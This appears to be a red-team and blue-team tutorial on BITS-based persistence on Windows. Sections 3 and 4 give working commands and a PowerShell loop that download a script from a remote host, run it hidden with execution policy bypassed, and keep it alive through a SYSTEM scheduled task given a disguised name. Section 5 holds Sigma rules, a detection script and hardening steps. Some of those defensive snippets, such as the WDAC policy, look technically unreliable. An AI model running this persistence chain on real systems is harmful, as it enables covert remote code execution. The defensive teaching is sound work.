# Persistence Using BITSAdmin

## 1. Introduction

### Overview of BITS and Its Role in Windows

Background Intelligent Transfer Service (BITS) is a Windows component that facilitates the asynchronous transfer of files between machines using idle network bandwidth. Originally designed for Windows Update and System Center Configuration Manager (SCCM), BITS operates as a service (`bitsadmin.exe` and `Background Intelligent Transfer Service`) that manages file transfers in the background without interrupting user activities.

BITS transfers files using HTTP/HTTPS protocols and supports:

- **Asynchronous downloads** — transfers occur during idle bandwidth
- **Resume capability** — transfers survive network interruptions and reboots
- **Prioritization** — jobs can be assigned different priority levels
- **Quota management** — bandwidth throttling and storage limits

### How Attackers Abuse BITS for Persistence and Stealthy Execution

Attackers leverage BITS for persistence due to several key advantages:

| Advantage | Description |
|-----------|-------------|
| **Living-off-the-Land (LOLBins)** | `bitsadmin.exe` is a legitimate signed Microsoft binary, bypassing many application whitelisting controls |
| **Persistence Across Reboots** | BITS jobs survive system restarts, maintaining persistence without registry or scheduled task modifications |
| **Minimal Footprint** | BITS operates in the background with low CPU and network priority, reducing detection surface |
| **Encrypted Transfers** | HTTPS-based BITS jobs encrypt payloads in transit, evading network-level inspection |
| **No New Services** | BITS leverages an existing Windows service, requiring no additional service creation |
| **Event Log Evasion** | BITS activity generates minimal log entries compared to PowerShell or WMI execution |

**MITRE ATT&CK Mapping:**

| Technique | ID | Description |
|-----------|----|-------------|
| BITS Jobs | T1197 | Adversaries use BITS to download, stage, and execute payloads |
| Scheduled Task/Job | T1053 | BITS jobs can be scheduled for recurring execution |
| Subvert Trust Controls | T1553 | Legitimate signed binary used to bypass application control |

---

## 2. Understanding BITS and Its Capabilities

### How BITS Functions in Windows

BITS operates as a Windows service with the following architecture:

```
┌─────────────────────────────────────────────────────────────────┐
│                      BITS Architecture                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │   bitsadmin   │    │  PowerShell  │    │  COM API     │      │
│  │   CLI Tool    │    │  Cmdlets     │    │  Interface   │      │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘      │
│         │                   │                   │               │
│         └───────────────────┼───────────────────┘               │
│                             │                                   │
│                    ┌────────▼────────┐                          │
│                    │   BITS Service   │                          │
│                    │   (bits.dll)     │                          │
│                    └────────┬────────┘                          │
│                             │                                   │
│              ┌──────────────┼──────────────┐                    │
│              │              │              │                     │
│        ┌─────▼─────┐ ┌─────▼─────┐ ┌─────▼─────┐              │
│        │   HTTP/   │ │   HTTPS   │ │   SMB     │              │
│        │    FTP    │ │  Transfer │ │  Transfer │              │
│        └───────────┘ └───────────┘ └───────────┘              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Key BITS Components:**

1. **bitsadmin.exe** — Command-line tool for creating and managing BITS jobs
2. **BITS Service** (`bits.dll`) — Core service handling transfer operations
3. **COM Interface** — Programmatic access via `IBackgroundCopyManager`
4. **PowerShell Cmdlets** — `Start-BitsTransfer`, `Get-BitsTransfer`, etc.

**BITS Job States:**

| State | Description |
|-------|-------------|
| Queued | Job created but not yet started |
| Connecting | Contacting remote server |
| Transferring | Data transfer in progress |
| Suspended | Transfer paused (can be resumed) |
| Error | Transfer failed |
| Transferred | Transfer completed successfully |
| Acknowledged | User acknowledged completion |
| Cancelled | Job was cancelled |

### Why Attackers Prefer BITS for Covert Operations

BITS provides several operational advantages for adversaries:

1. **No Direct Execution** — BITS downloads files without executing them; attackers combine with scheduled tasks or WMI for execution
2. **Bandwidth Awareness** — BITS uses idle bandwidth, making large transfers less noticeable
3. **Resume on Reboot** — Jobs persist across system restarts without additional configuration
4. **Notification Callbacks** — BITS can trigger commands upon job completion via notification commands
5. **Multiple Job Types** — Download, upload, and reply jobs provide flexibility for different attack scenarios
6. **Administrative Privileges** — BITS jobs run in the context of the creating user, inheriting appropriate permissions

---

## 3. Creating a Malicious BITS Job

### Prerequisites

> **⚠️ AUTHORIZATION NOTICE:** The following techniques are provided for educational purposes in authorized lab environments only. Always obtain written authorization before testing on any system you do not own.

**Environment Requirements:**

- Windows 10/11 or Windows Server 2016+
- Administrator or SYSTEM privileges
- Network access to payload hosting location
- Lab environment with no production impact

### Step-by-Step: Creating and Executing a BITS Job

#### Step 1: Enumerate Existing BITS Jobs

Before creating a new job, enumerate existing BITS jobs to understand the current state:

```cmd
:: List all BITS jobs for the current user
bitsadmin /list /allusers

:: Display detailed job information
bitsadmin /list /allusers /verbose

:: Check BITS service status
sc query bits
```

**Expected Output:**

```
 BITSAdmin utility version (10.0.19041.1)
The date is 7/22/2026.
{GUID-HERE}
    Type: DOWNLOAD
    State: TRANSFERRED (2)
    Owned by: <DOMAIN>\<USER>
    Priority: NORMAL (NORMAL_PRIORITY_CLASS)
    Files: 1/1
        {FILE-GUID}
            Source: https://example.com/payload.bin
            Destination: C:\Users\<USER>\AppData\Local\Temp\payload.bin
            Progress: 100/100 (100%)
            Transfer rate: 1024 kbps
            Minimum retry delay: 0 seconds
            No progress timeout: 0 seconds
            Total size: 1024 bytes
            Bytes transferred: 1024 bytes
```

#### Step 2: Prepare the Payload

For demonstration purposes, create a benign payload (e.g., a script that logs execution):

```powershell
# payload.ps1 - Benign demonstration payload
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$logEntry = "[$timestamp] BITS payload executed on $env:COMPUTERNAME by $env:USERNAME"
Add-Content -Path "$env:TEMP\bits_execution.log" -Value $logEntry
Write-Output "BITS payload executed successfully"
```

Host this payload on a local web server (e.g., `http://192.168.1.100:8080/payload.ps1`).

#### Step 3: Create the BITS Download Job

```cmd
:: Create a new BITS job
bitsadmin /create "MaliciousUpdate"

:: Add a file to the job (source URL and destination path)
bitsadmin /addfile "MaliciousUpdate" "http://192.168.1.100:8080/payload.ps1" "C:\Windows\Temp\update.ps1"

:: Set job priority (foreground to ensure faster completion)
bitsadmin /setpriority "MaliciousUpdate" "FOREGROUND_PRIORITY"

:: Resume the job to start the download
bitsadmin /resume "MaliciousUpdate"

:: Monitor job progress
bitsadmin /info "MaliciousUpdate" /verbose

:: Wait for completion
bitsadmin /complete "MaliciousUpdate"
```

#### Step 4: Execute the Downloaded Payload

```cmd
:: Execute the downloaded script
powershell -ExecutionPolicy Bypass -File "C:\Windows\Temp\update.ps1"
```

**PowerShell Alternative (All-in-One):**

```powershell
# Create BITS job using PowerShell cmdlets
$job = Start-BitsTransfer -Source "http://192.168.1.100:8080/payload.ps1" `
                          -Destination "C:\Windows\Temp\update.ps1" `
                          -DisplayName "SystemUpdate" `
                          -Priority High `
                          -ErrorAction Stop

# Execute the downloaded payload
powershell -ExecutionPolicy Bypass -File "C:\Windows\Temp\update.ps1"
```

#### Step 5: Configure Notification Command (Auto-Execute)

BITS can execute commands upon job completion using notification commands:

```cmd
:: Set a notification command to execute after download completes
bitsadmin /SetNotifyCmdLine "MaliciousUpdate" "C:\Windows\System32\cmd.exe" "cmd /c powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1"

:: Complete the job
bitsadmin /complete "MaliciousUpdate"
```

**Important:** Notification commands execute in the context of the user who created the BITS job. For SYSTEM-level execution, use the `SYSTEM` account context.

---

## 4. Implementing a Persistence Mechanism

### PowerShell Checker Script

Create a monitoring script that verifies the BITS job exists and recreates it if removed:

```powershell
# bits_persistence_checker.ps1
# BITS Persistence Monitoring and Recovery Script
# Educational purposes only - authorized lab environments only

param(
    [string]$JobName = "SystemUpdate",
    [string]$PayloadUrl = "http://192.168.1.100:8080/payload.ps1",
    [string]$LocalPath = "C:\Windows\Temp\update.ps1",
    [int]$CheckIntervalSeconds = 300,
    [string]$LogFile = "$env:TEMP\bits_checker.log"
)

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    Add-Content -Path $LogFile -Value $logEntry
    Write-Host $logEntry
}

function Test-BitsJobExists {
    param([string]$Name)
    try {
        $jobs = Get-BitsTransfer -ErrorAction SilentlyContinue |
                Where-Object { $_.DisplayName -eq $Name }
        return ($null -ne $jobs -and $jobs.Count -gt 0)
    } catch {
        return $false
    }
}

function New-MaliciousBitsJob {
    param(
        [string]$Name,
        [string]$Source,
        [string]$Destination
    )
    try {
        $job = Start-BitsTransfer -Source $Source `
                                  -Destination $Destination `
                                  -DisplayName $Name `
                                  -Priority High `
                                  -ErrorAction Stop
        Write-Log "BITS job '$Name' created successfully"
        return $true
    } catch {
        Write-Log "Failed to create BITS job: $_" -Level "ERROR"
        return $false
    }
}

function Invoke-PayloadExecution {
    param([string]$PayloadPath)
    try {
        if (Test-Path $PayloadPath) {
            Start-Process -FilePath "powershell.exe" `
                         -ArgumentList "-ExecutionPolicy Bypass -File `"$PayloadPath`"" `
                         -WindowStyle Hidden `
                         -ErrorAction Stop
            Write-Log "Payload executed from $PayloadPath"
            return $true
        } else {
            Write-Log "Payload not found at $PayloadPath" -Level "WARNING"
            return $false
        }
    } catch {
        Write-Log "Payload execution failed: $_" -Level "ERROR"
        return $false
    }
}

function Get-BitsJobStatus {
    param([string]$Name)
    try {
        $job = Get-BitsTransfer -ErrorAction SilentlyContinue |
               Where-Object { $_.DisplayName -eq $Name } |
               Select-Object -First 1

        if ($job) {
            return @{
                Exists = $true
                State = $job.JobState
                FilesTransferred = $job.FilesTransferred
                BytesTransferred = $job.BytesTransferred
            }
        }
        return @{ Exists = $false }
    } catch {
        return @{ Exists = $false }
    }
}

# Main persistence loop
Write-Log "BITS Persistence Checker started"
Write-Log "Job Name: $JobName"
Write-Log "Payload URL: $PayloadUrl"
Write-Log "Check Interval: $CheckIntervalSeconds seconds"

while ($true) {
    $jobStatus = Get-BitsJobStatus -Name $JobName

    if (-not $jobStatus.Exists) {
        Write-Log "BITS job '$JobName' not found - recreating" -Level "WARNING"

        $created = New-MaliciousBitsJob -Name $JobName `
                                        -Source $PayloadUrl `
                                        -Destination $LocalPath

        if ($created) {
            Write-Log "Verifying download completed..."
            Start-Sleep -Seconds 10

            $executed = Invoke-PayloadExecution -PayloadPath $LocalPath
            if ($executed) {
                Write-Log "Persistence check completed successfully"
            }
        }
    } else {
        Write-Log "BITS job exists - State: $($jobStatus.State)"

        if ($jobStatus.State -eq "Transferred") {
            Write-Log "Job completed - executing payload"
            Invoke-PayloadExecution -PayloadPath $LocalPath
        }
    }

    Write-Log "Next check in $CheckIntervalSeconds seconds"
    Start-Sleep -Seconds $CheckIntervalSeconds
}
```

### Automating with Scheduled Tasks

Create a scheduled task to run the checker script at system startup:

```powershell
# Create scheduled task for BITS persistence checker
$taskName = "SystemUpdateChecker"
$taskPath = "$env:TEMP\bits_persistence_checker.ps1"

# Create the task action
$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$taskPath`""

# Create trigger (at startup and every 5 minutes)
$triggerStartup = New-ScheduledTaskTrigger -AtStartup
$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Days 3650)

# Create task settings
$settings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 1) `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable

# Register the task
Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger @($triggerStartup, $triggerRepeat) `
    -Settings $settings `
    -User "SYSTEM" `
    -RunLevel Highest `
    -Description "System Update Verification Service"

Write-Output "Scheduled task '$taskName' created successfully"
```

**BITS Persistence Flow:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    BITS Persistence Flow                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │   System    │    │   Checker   │    │   BITS Job  │         │
│  │   Boot      │───▶│   Script    │───▶│   Verify    │         │
│  └─────────────┘    └──────┬──────┘    └──────┬──────┘         │
│                            │                   │                 │
│                     ┌──────▼──────┐    ┌──────▼──────┐         │
│                     │   Job      │    │   Recreate  │         │
│                     │   Exists?  │───▶│   Job       │         │
│                     └──────┬──────┘    └──────┬──────┘         │
│                            │                   │                 │
│                     ┌──────▼──────┐    ┌──────▼──────┐         │
│                     │   Execute   │    │   Wait for  │         │
│                     │   Payload   │◀───│   Download  │         │
│                     └─────────────┘    └─────────────┘         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Detecting and Preventing Malicious BITS Jobs

### Identifying Suspicious BITS Jobs Using Windows Event Logs

#### Key Event IDs for BITS Monitoring

| Event ID | Log Source | Description |
|----------|-----------|-------------|
| 4688 | Security | Process creation (bitsadmin.exe execution) |
| 59 | BITS-Client | BITS job created |
| 60 | BITS-Client | BITS job transferred |
| 3 | BITS-Client | BITS job error occurred |
| 4 | BITS-Client | BITS job acknowledged |
| 1 | Microsoft-Windows-Bits-Client | Job transfer started |

#### Sigma Detection Rules

```yaml
# Sigma Rule: Suspicious BITS Job Creation
title: Suspicious BITS Job Creation via Command Line
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects BITS job creation via command line with suspicious parameters
references:
  - https://attack.mitre.org/techniques/T1197/
tags:
  - attack.persistence
  - attack.t1197
  - attack.defense_evasion
  - attack.t1218
logsource:
  category: process_creation
  product: windows
detection:
  selection_bitsadmin:
    Image|endswith:
      - '\bitsadmin.exe'
  selection_suspicious_params:
    CommandLine|contains:
      - '/create'
      - '/addfile'
      - '/SetNotifyCmdLine'
      - '/resume'
  selection_suspicious_parent:
    ParentImage|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
  condition: selection_bitsadmin and (selection_suspicious_params or selection_suspicious_parent)
falsepositives:
  - Legitimate Windows Update operations
  - SCCM/WSUS managed deployments
  - IT administrative scripts
level: medium
```

```yaml
# Sigma Rule: BITS Notification Command Execution
title: BITS Job Notification Command Execution
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects BITS jobs configured with notification commands for execution
tags:
  - attack.persistence
  - attack.t1197
  - attack.execution
  - attack.t1059
logsource:
  category: process_creation
  product: windows
detection:
  selection_bitsadmin:
    Image|endswith:
      - '\bitsadmin.exe'
  selection_notify:
    CommandLine|contains:
      - '/SetNotifyCmdLine'
      - 'SetNotifyCmdLine'
  selection_cmd_execution:
    CommandLine|contains:
      - 'cmd.exe'
      - 'powershell.exe'
      - 'wscript.exe'
      - 'cscript.exe'
      - 'mshta.exe'
      - 'rundll32.exe'
  condition: selection_bitsadmin and selection_notify and selection_cmd_execution
falsepositives:
  - Rare legitimate administrative automation
level: high
```

```yaml
# Sigma Rule: Suspicious BITS Transfer to Executable Location
title: BITS Transfer to Suspicious Location
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: Detects BITS transfers saving to locations commonly used for persistence
tags:
  - attack.persistence
  - attack.t1197
logsource:
  product: windows
  service: bits-client
detection:
  selection_event:
    EventID: 59
  selection_suspicious_paths:
    - '\AppData\Local\Temp\'
    - '\Windows\Temp\'
    - '\ProgramData\'
    - '\Users\Public\'
    - '\Windows\System32\'
    - '\Windows\SysWOW64\'
  selection_file_extensions:
    - '*.exe'
    - '*.dll'
    - '*.ps1'
    - '*.bat'
    - '*.cmd'
    - '*.vbs'
    - '*.js'
    - '*.hta'
  condition: selection_event and (selection_suspicious_paths or selection_file_extensions)
falsepositives:
  - Windows Update downloads to Temp directory
  - Legitimate software installation packages
level: high
```

#### PowerShell Detection Script

```powershell
# bits_detection.ps1
# BITS Anomaly Detection Script for Blue Team Operations

function Get-SuspiciousBitsJobs {
    $suspiciousJobs = @()

    try {
        $allJobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue

        foreach ($job in $allJobs) {
            $riskScore = 0
            $indicators = @()

            # Check 1: Job created by non-standard user context
            if ($job.Owner -notmatch '(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)') {
                $riskScore += 1
                $indicators += "Non-service owner: $($job.Owner)"
            }

            # Check 2: Suspicious destination paths
            $suspiciousPaths = @(
                '\AppData\Local\Temp\',
                '\Windows\Temp\',
                '\ProgramData\',
                '\Users\Public\'
            )
            foreach ($file in $job.FilesTransferred) {
                foreach ($path in $suspiciousPaths) {
                    if ($file.DestinationName -like "*$path*") {
                        $riskScore += 2
                        $indicators += "Suspicious destination: $($file.DestinationName)"
                    }
                }
            }

            # Check 3: Executable file extensions
            $executableExtensions = @('.exe', '.dll', '.ps1', '.bat', '.cmd', '.vbs', '.js', '.hta')
            foreach ($file in $job.FilesTransferred) {
                $extension = [System.IO.Path]::GetExtension($file.DestinationName)
                if ($extension -in $executableExtensions) {
                    $riskScore += 3
                    $indicators += "Executable extension: $extension"
                }
            }

            # Check 4: Non-standard BITS priority
            if ($job.Priority -eq 'Foreground') {
                $riskScore += 1
                $indicators += "Foreground priority (unusual for background transfers)"
            }

            # Check 5: Notification command configured
            if ($job.NotificationCommandLine) {
                $riskScore += 5
                $indicators += "Notification command configured: $($job.NotificationCommandLine)"
            }

            # Check 6: Large file size anomaly
            if ($job.BytesTotal -gt 100MB) {
                $riskScore += 2
                $indicators += "Large file size: $([math]::Round($job.BytesTotal / 1MB, 2)) MB"
            }

            if ($riskScore -ge 3) {
                $suspiciousJobs += [PSCustomObject]@{
                    JobId = $job.JobId
                    DisplayName = $job.DisplayName
                    Owner = $job.Owner
                    Priority = $job.Priority
                    RiskScore = $riskScore
                    Indicators = $indicators
                    State = $job.JobState
                }
            }
        }
    } catch {
        Write-Warning "Error enumerating BITS jobs: $_"
    }

    return $suspiciousJobs
}

# Run detection
Write-Host "=== BITS Anomaly Detection ===" -ForegroundColor Cyan
$suspicious = Get-SuspiciousBitsJobs

if ($suspicious.Count -eq 0) {
    Write-Host "No suspicious BITS jobs detected." -ForegroundColor Green
} else {
    Write-Host "Found $($suspicious.Count) suspicious BITS job(s):" -ForegroundColor Red
    foreach ($job in $suspicious) {
        Write-Host "`nJob: $($job.DisplayName) (Risk Score: $($job.RiskScore))" -ForegroundColor Yellow
        Write-Host "  Owner: $($job.Owner)"
        Write-Host "  State: $($job.State)"
        Write-Host "  Indicators:"
        foreach ($indicator in $job.Indicators) {
            Write-Host "    - $indicator" -ForegroundColor Red
        }
    }
}
```

### Security Measures to Detect and Block Unauthorized BITS Jobs

#### Group Policy Configuration

```
Computer Configuration
  └─ Administrative Templates
     └─ Network
        └─ Background Intelligent Transfer Service (BITS)
           ├─ Limit the maximum bandwidth (bits/s) for BITS jobs
           │   └─ Set to: 0 (use default) or restrictive value
           ├─ Limit the maximum number of BITS jobs
           │   └─ Set to: 0 (unlimited) or low value (1-2)
           ├─ Enable BITS bandwidth limits while connected
           │   └─ Set to: Enabled
           └─ Set up a work schedule to limit the maximum network bandwidth
               └─ Configure to restrict BITS activity to maintenance windows
```

#### Windows Firewall Rules

```powershell
# Block BITS transfers to known malicious IP ranges (example)
New-NetFirewallRule -DisplayName "Block BITS to Suspicious IPs" `
    -Direction Outbound `
    -Protocol TCP `
    -RemoteAddress "192.168.100.0/24" `
    -Action Block `
    -Profile Any `
    -Description "Blocks BITS transfers to untrusted network segments"
```

#### AppLocker/WDAC Rules

```xml
<!-- WDAC Policy: Block bitsadmin.exe from non-admin contexts -->
<SiPolicy>
  <Rules>
    <Deny ID="ID_DENY_BITSBADMIN" FriendlyName="Block BITSAdmin from Standard Users" />
    <Allow ID="ID_ALLOW_BITSSERVICE" FriendlyName="Allow BITS Service" />
  </Rules>
  <Conditions>
    <ProductSigners>
      <AllowedSigners>
        <AllowedSigner Name="ID_ALLOW_Microsoft" />
      </AllowedSigners>
    </ProductSigners>
  </Conditions>
</SiPolicy>
```

#### Sysmon Configuration for BITS Detection

```xml
<!-- Sysmon config snippet for BITS monitoring -->
<Sysmon>
  <EventFiltering>
    <!-- Monitor bitsadmin.exe execution -->
    <ProcessCreate onmatch="include">
      <Image condition="is">C:\Windows\System32\bitsadmin.exe</Image>
      <Image condition="is">C:\Windows\SysWOW64\bitsadmin.exe</Image>
    </ProcessCreate>

    <!-- Monitor BITS-related file creation -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">AppData\Local\Temp\</TargetFilename>
    </FileCreate>

    <!-- Monitor BITS service DLL loads -->
    <ImageLoad onmatch="include">
      <ImageLoaded condition="is">C:\Windows\System32\bits.dll</ImageLoaded>
    </ImageLoad>
  </EventFiltering>
</Sysmon>
```

#### Windows Event Forwarding to SIEM

```xml
<!-- WEC Subscription for BITS monitoring -->
<Subscription xmlns="http://schemas.microsoft.com/2006/03/windows/events/subscription">
    <SubscriptionId>BITS-Monitoring</SubscriptionId>
    <SubscriptionType>SourceInitiated</SubscriptionType>
    <Description>Monitor BITS activity for security analysis</Description>
    <Query>
        <![CDATA[
        <QueryList>
            <Query Id="0" Path="Security">
                <Select Path="Security">*[System[(EventID=4688)] and EventData[Data[@Name='NewProcessName'] and (Data='C:\Windows\System32\bitsadmin.exe' or Data='C:\Windows\SysWOW64\bitsadmin.exe')]]</Select>
            </Query>
            <Query Id="1" Path="Microsoft-Windows-Bits-Client/Operational">
                <Select Path="Microsoft-Windows-Bits-Client/Operational">*[System]</Select>
            </Query>
        </QueryList>
        ]]>
    </Query>
</Subscription>
```

#### Hardening Checklist

```
Detection & Prevention:
[ ] Enable PowerShell Script Block Logging (GPO)
[ ] Enable PowerShell Module Logging (GPO)
[ ] Deploy Sysmon with BITS-specific monitoring rules
[ ] Configure Windows Event Forwarding for BITS events
[ ] Enable command-line logging in Event ID 4688
[ ] Set up SIEM correlation rules for BITS anomalies

Prevention:
[ ] Restrict BITS job creation to administrators via Group Policy
[ ] Implement WDAC/AppLocker rules for bitsadmin.exe
[ ] Monitor and alert on bitsadmin.exe in non-standard contexts
[ ] Configure BITS bandwidth limits via Group Policy
[ ] Restrict BITS job creation to specific IP ranges

Monitoring:
[ ] Regular audits of active BITS jobs
[ ] Alert on BITS jobs with notification commands
[ ] Monitor for BITS transfers to executable locations
[ ] Track BITS job creation frequency anomalies
[ ] Review BITS-Client operational logs weekly
```

---

## 6. Conclusion

### Summary of the Attack Method

BITSAdmin persistence leverages a legitimate Windows service to create covert persistence mechanisms that survive reboots and evade common detection methods. The attack chain consists of:

1. **Job Creation** — Using `bitsadmin.exe` or PowerShell to create BITS jobs that download payloads
2. **Payload Delivery** — Transferring malicious files via HTTPS, blending with legitimate traffic
3. **Execution Trigger** — Configuring notification commands or combining with scheduled tasks for payload execution
4. **Persistence Maintenance** — Implementing monitoring scripts to recreate removed jobs

The technique is particularly effective because BITS operates as a signed Microsoft binary, uses idle bandwidth for transfers, and generates minimal log activity compared to other execution methods.

### Best Practices for Defense and Mitigation

**Immediate Actions:**

1. **Enable Comprehensive Logging** — Deploy Sysmon, enable PowerShell Script Block Logging, and configure Windows Event Forwarding for BITS-specific events
2. **Monitor BITS Jobs** — Regularly audit active BITS jobs and alert on anomalies (unusual owners, suspicious paths, notification commands)
3. **Implement Application Control** — Use WDAC or AppLocker to restrict `bitsadmin.exe` execution to authorized administrators

**Long-Term Strategy:**

1. **Behavioral Detection** — Implement SIEM correlation rules that detect BITS job creation patterns rather than relying on signature-based detection
2. **Network Segmentation** — Restrict outbound BITS transfers to known legitimate destinations
3. **Regular Audits** — Schedule periodic reviews of BITS jobs, scheduled tasks, and system persistence mechanisms
4. **Purple Team Exercises** — Conduct regular red team engagements to validate BITS detection capabilities

**Key Detection Indicators:**

| Indicator | Risk Level | Detection Method |
|-----------|-----------|------------------|
| `bitsadmin.exe` execution from non-admin user | High | Event ID 4688 |
| BITS job with notification command | Critical | BITS-Client logs, Sysmon |
| BITS transfer to executable location | High | File creation monitoring |
| BITS job created by PowerShell/cmd | Medium | Process creation logs |
| Large BITS transfers (>100MB) | Medium | BITS-Client operational logs |
| BITS jobs outside maintenance windows | Low | Time-based correlation |

By implementing these detection and prevention measures, organizations can significantly reduce the risk of BITS-based persistence attacks while maintaining visibility into legitimate BITS usage for system updates and management.

---

## References

- [MITRE ATT&CK: BITS Jobs (T1197)](https://attack.mitre.org/techniques/T1197/)
- [Microsoft Docs: BITS](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service)
- [Microsoft Docs: bitsadmin.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin)
- [LOLBAS Project: bitsadmin.exe](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)
- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)
- [Sysmon Configuration (SwiftOnSecurity)](https://github.com/SwiftOnSecurity/sysmon-config)
- [NSA Cybersecurity Guidance: BITS Abuse](https://www.nsa.gov/Press-Room/Cybersecurity-Advisories-Guidance/)

